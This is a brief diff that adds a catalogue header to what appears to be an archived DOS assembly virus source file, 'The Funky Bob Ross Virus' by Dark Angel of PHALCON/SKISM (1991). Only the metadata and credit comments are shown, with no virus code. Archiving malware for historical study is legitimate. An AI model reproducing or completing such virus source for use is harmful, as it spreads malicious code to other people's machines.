@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      B
+; type      asm
+; cve       —
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     —
+; ------------------------------------------------------------
 ; The Funky Bob Ross Virus Version 1.0
 ; Written by Dark Angel / 26 September 1991 / (c) 1991
 ; PHALCON/SKISM Co-op
